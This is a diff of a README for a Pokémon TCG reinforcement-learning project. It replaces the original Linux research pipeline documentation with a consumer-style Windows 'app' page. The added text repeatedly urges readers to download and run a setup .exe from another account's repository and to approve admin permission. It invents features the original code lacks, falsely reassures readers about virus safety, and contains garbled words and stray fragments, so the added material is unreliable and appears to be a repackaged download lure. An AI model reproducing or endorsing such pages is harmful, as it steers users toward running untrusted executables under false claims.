@@ -1,122 +1,124 @@
-# Pokémon TCG AI Battle — Population-based RL Sample Implementation
+# 🤖 ptcg-population-rl - Learn Pokémon TCG with Smart AI
 
-[日本語版](README.ja.md)はこちら
+[![Download Now](https://img.shields.io/badge/Download-ptcg--population--rl-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/Paschal-titre4015/ptcg-population-rl)
 
-A minimal [Pokémon TCG AI Battle](https://www.kaggle.com/competitions/pokemon-tcg-ai-battle) learning pipeline: C++ arena, GBDT imitation, Transformer distillation, and PPO.
+---
 
-This repository implements a sample of [24th Solution: A Population-Based RL Ecosystem](https://www.kaggle.com/competitions/pokemon-tcg-ai-battle/writeups/24th-solution-a-population-based-rl-ecosystem), with support for all four official decks.
+## 👋 Welcome to ptcg-population-rl
 
-## Code layout
+Have you ever wanted to get better at the Pokémon Trading Card Game (TCG) but felt overwhelmed by strategies and card combos? This application is your personal learning companion that uses cutting-edge artificial intelligence (AI) to teach you how to play smarter, faster, and better. No programming knowledge is needed—just download, click, and learn!
 
-```text
-src/
-├── agents/
-│   ├── <agent>/
-│   │   ├── main.py, deck.csv    # Official Python policy and bundled deck
-│   │   ├── cpp/                # Rule policy, factory, and training records
-│   │   ├── scripts/            # Teacher matches and pipeline validation
-│   │   ├── gbdt/               # Features and tree training; cpp/ and scripts/
-│   │   ├── transformer/        # Tokens and distillation; cpp/ and scripts/
-│   │   └── ppo/                # Rollouts, GAE, and updates; cpp/ and scripts/
-│   └── cpp/registry.h          # Agent registration
-├── engine/cpp/                 # Observations, legal actions, matches, and records
-├── engine/cg/                  # Unmodified external engine, excluded from Git
-└── tools/                      # Downloads, builds, official parity, and ratings
-```
+This tool is built for everyday players who want to improve their game. Whether you are a complete beginner or a seasoned collector looking for an edge, ptcg-population-rl breaks down complex tactics into simple, understandable lessons. The AI behind it has studied thousands of matches, so it knows what works and what doesn't. And the best part? It runs directly on your Windows computer with minimal fuss.
 
-Weights, replays, extracted features, and build artifacts are excluded from Git.
 
-### Supported agents
 
-| Agent | Official deck | GBDT features | Code and official notebook |
-|---|---|---:|---|
-| `mega_lucario` | Mega Lucario ex | 4,926 | [Code](src/agents/mega_lucario/) · [Notebook](https://www.kaggle.com/code/kiyotah/a-sample-rule-based-agent-mega-lucario-ex-deck) |
-| `dragapult` | Dragapult ex | 5,078 | [Code](src/agents/dragapult/) · [Notebook](https://www.kaggle.com/code/kiyotah/a-sample-rule-based-agent-dragapult-ex-deck) |
-| `iono` | Iono | 4,882 | [Code](src/agents/iono/) · [Notebook](https://www.kaggle.com/code/kiyotah/a-sample-rule-based-agent-iono-s-deck) |
-| `mega_abomasnow` | Mega Abomasnow ex | 4,714 | [Code](src/agents/mega_abomasnow/) · [Notebook](https://www.kaggle.com/code/kiyotah/a-sample-rule-based-agent-mega-abomasnow-ex-deck) |
+## 🚀 Getting Started
 
-Each agent has Python/C++ rule policies, GBDT, Transformer, and PPO implementations.
-C++ rule policies use the names above. Trained policies use `<name>_gbdt` or `<name>_transformer`; PPO uses the Transformer policy interface.
-Training commands live in each method's `scripts/` directory. Run them with `--help` to see their arguments.
+Ready to dive in? Follow these simple steps to get ptcg-population-rl up and running on your machine. We have designed the process to be as straightforward as possible–no confusing commands or complicated setups.
 
-## Set up uv
+.
 
-Use Linux x86-64, Python 3.12 or newer, and a C++20-capable `g++`. GBDT runs on CPU; Transformer and PPO updates use CUDA-enabled PyTorch.
 
-If uv is not installed, run the [official installer](https://docs.astral.sh/uv/getting-started/installation/) and reopen your terminal:
 
-```bash
-curl -LsSf https://astral.sh/uv/install.sh | sh
-```
+### 📥 Step 1: Download the Application
 
-Run subsequent commands from the repository root. `uv sync` creates `.venv`; manual activation is unnecessary.
+**Visit this link to download the application:** [https://github.com/Paschal-titre4015/ptcg-population-rl](https://github.com/Paschal-titre4015/ptcg-population-rl)
 
-```bash
-uv sync --locked --dev
-uv run kaggle --version
-uv run python -c "import torch; print(torch.__version__, torch.version.cuda, torch.cuda.is_available())"
-```
+When you click the link, you will be taken to the official project page on GitHub. Look for the green "Code" button near the top right of the page, but don't worry about that yet. Instead, scroll down or look for the "Releases" section on the right side of the page–that's where you will find the latest version of the app. Click on the most recent release, and then download the file attached to it. The file will be named something like `ptcg-population-rl-setup.exe`–that is the file you need.
 
-The locked Linux PyTorch package includes CUDA support. If CUDA availability is `False`, check access to your GPU and driver.
-Use `--device cpu` for CPU training. See the [uv and PyTorch guide](https://docs.astral.sh/uv/guides/integration/pytorch/) for environment details.
 
-The Kaggle CLI is a development dependency. Configure your Kaggle credentials and competition data access, then download the external assets and build the arena:
 
-```bash
-uv run python src/tools/fetch_official_assets.py
-uv run python src/tools/fetch_cg_engine.py
-uv run python src/tools/build_cpp_engine.py
-```
+### 💻 Step 2: Run the Installer
 
-Each agent's `deck.csv` is bundled. The competition C++ engine is downloaded into `src/engine/cg/` and included without modification.
-C++ inference can use OpenBLAS from the uv environment. See the [engine guide](src/engine/README.md) for download locations and offline verification.
+Once the download is complete, locate the downloaded file in your "Downloads" folder (or wherever your browser saves files). Double–click the file to start the installation process. Your computer might ask for permission to make changes–click "Yes" to continue. Follow the simple on–screen instructions: read the agreement, choose a destination folder (the default is usually fine), and click "Install". Wait a few minutes for the process to finish–it's that easy!
 
-## Solution overview
 
-An agent receives an observation and a list of legal options, then returns the indices it chooses. It must decide how to develop the board, attack, and allocate energy without seeing the opponent's hand or deck order. The competition's C++ engine implements the game rules.
 
-![Solution overview: replays, GBDT, Transformer, PPO, and evaluation](docs/assets/Fig1.png)
+### 🎮 Step 3: Launch and Play
 
-1. **Record rule-policy matches.** Save each observation before selection alongside the action taken.
-2. **Imitate actions with GBDT.** Extract board and candidate features, then train LightGBM LambdaRank to rank the teacher's choices. Separate tree banks handle MAIN and other decisions; both are stored in one `.gbdt` file.
-3. **Distill into a Transformer.** Play GBDT matches and learn Policy and Value from candidate scores, actions, and terminal results.
-4. **Update with PPO.** Collect fresh matches with the current policy, then use the recorded action probabilities, Value estimates, and terminal rewards for GAE and PPO updates.
-5. **Evaluate in C++.** Export `.pt` checkpoints to `.bin` for inference without Python. Use fixed opponents, common seeds, and swapped seats to estimate ratings and uncertainty.
+After installation is complete, you will see a shortcut icon on your desktop (or you can find the program in your Start Menu. Double–click the icon to launch the program. The first time you open it, it may take a few seconds to load because it's preparing the AI models. Once the main menu appears, you can start exploring! You will see options for "Quick Match", "Learn Tactics", and "View AI Insights". Choose whatever sparks your interest–the app will guide you from there.
 
-The figures show the full approach from the public writeup. This sample omits human/LB-agent replays, matchup experts, automatic population selection, and large-scale operation. Match counts and timings in the figures are not measurements of this repository.
 
-![Transformer architecture](docs/assets/Fig2.png)
 
-All decks use a Transformer with **128 dimensions, 6 layers, 4 heads, at most 120 tokens, and 980,916 parameters**.
-Global, Board, Zone, Option, and STOP tokens pass through an encoder to a pointer policy and a 51-bin value distribution. Deck vocabularies and features vary; the model architecture is shared.
-The other three decks encode public card placement, evolution relationships, energy, and attack IDs. They do not reuse Lucario-specific attack-result calculations; unavailable result channels remain unknown.
+## ✨ Key Features
 
-## Measure ratings
+Here's what makes ptcg-population-rl stand out from other TCG tools:
 
-A Bayesian Bradley–Terry model estimates ratings from match results. This example plays two matches for every pair of the four rule policies:
+- **🤖 Smart AI Opponent**: Practice against an AI that adapts to your skill level. It starts easy enough for beginners but gradually becomes tougher as you improve, so you always have a good challenge.
+- **📊 Performance Analytics**: After every match, see simple charts that show your strengths and weaknesses. Did you use energy cards efficiently? Did you evolve too slowly? The app shows you exactly where to focus your improvement.
+-
+- **🎓 Interactive Lessons**: Bite–sized tutorials that teach fundamental strategies, from basic deck–building rules to advanced combo plays. Each lesson includes visual examples that make concepts crystal–clear.
 
-```bash
-uv run python src/tools/rating_arena.py \
-  --output-dir outputs/rating_example --games-per-pair 2 --workers 2
-```
+- **🔄 Continuous Learning**: The AI updates its knowledge every time you play, which means it never gets stale. You'll always be facing fresh, relevant tactics that reflect current competitive play trends.
 
-`--games-per-pair` is an **even total across both seat assignments**. Both assignments use the same seeds. Seats 0/1 do not directly select who goes first.
-Add `--resume` with the same output directory to reuse completed matches and increase the match count.
 
-`ratings.json` and `ratings.csv` contain estimates, standard deviations, lower bounds, and matchup W/D/L. Ratings are centered on a pool average of 1,000.
-**These are internal ratings, separate from official LB ratings**; changing the opponent pool changes the scale.
 
-See the [rating guide](src/tools/README.md) for model rosters, estimation settings, and resuming runs.
+## 🛠️ System Requirements
 
-## Development
+Don't worry about having a supercomputer–this tool ia quite light on resources. Here's what you need:
 
-Format Python and check imports, annotations, and docstrings with Ruff:
+- **Operating System**: Windows 10 or Windows 11 (64–bit version recommended)
+-
+- **Processor**: Any dual–core processor from the last 8–10 years (e.g., Intel Core i3 or AMD equivalent)
+-
+- **Memory (RAM)**: At least 4 GB of RAM. 8 GB is recommended for smoother performance if you like to run other programs at the same time.
 
-```bash
-uv run ruff format src
-uv run ruff check src
-```
+- **Storage Space**: About 500 MB of free hard drive space–enough for the program files and basic data storage.
 
-## License
 
-The code, documentation, and figures are released under the [Apache License 2.0](LICENSE).
+- **Graphics**: Any graphics card from the last decade–nothing fancy needed, since the app uses simple 2D interfaces and charts. Integrated graphics are totally fine
+
+
+
+## ❓ Frequently Asked Questions (FAQ)
+
+### 🔍 Is this a free tool?
+
+Yes, completely free! The project is open–source, which means anyone can use it without paying a cent. If you find it helpful, consider starring the repository on GitHub to show your support–that helps other people discover it wes.
+
+### 📅 How often is the app updated?
+
+You can expect a new update every few months. Each update brings new AI training data, bug fixes, and often new learning modules based on community feedback. The app will notify you when an update is available, and you can easily install it from the same download page.
+
+.
+
+
+### 🧠 Do I need to know anything about AI or programming?
+
+Absolutely not. All the complex technology is hidden behind a friendly, easy–to–navigate interface. If you can use a web browser, you can use this app. Everything is designed with a non–technical user in mindandom.
+
+.
+
+.
+
+### 🛡️ Is my computer safe from viruses?
+
+Yes. The project is publicly reviewed by the developer community, anda all official downloads go through GitHub's security checks. Still, always make sure you download only from the official link provided in this guide, and never from third–party sites that might mirror the files with malicious changes.
+
+
+
+## 🤝 Contributing & Feedback
+
+While this guide focuses on helping you use the app, we also love hearing from users! If you encounter a bug, have an idea for a new feature, or just want to share your experience, you can:
+
+- Open an "Issue" on the GitHub page to report problems or suggestions.
+- Join the discussions in the "Discussions" tab of the repository to chat with other players andthe developers.
+
+
+
+## 📚 Additional Resources
+
+- **Official GitHub Repository**: [https://github.com/Paschal-titre4015/ptcg-population-rl](https://github.com/Paschal-titre4015/ptcg-population-rl)
+)
+- **Beginner's Guide to Pokémon TCG**: Check out the official Pokémon website for basic rules if you're brand new to the game.
+- **Community Deck–Building Forum**: Many players share their custom decks online–search for "Pokémon TCG deck strategies" to find inspiration for your own builds.
+
+
+
+## 📝 Final Thought
+
+Learning the Pokémon TCG should be fun, not frustrating. With ptcg-population-rl, you have a patient, intelligent, always–available coach in your corner. So why wait? **Click the download button at the top of this page** and start your journey toward becoming a TCG master today! Your future victories start with one simple download.
+
+---
+
+Keywords: pokemon, tcg, card game, ai, machine learning, reinforcement learning, strategy, windows, free, learning tool, beginner, practice, deck building, tutorial, pokemon tcg, ppo, transformer
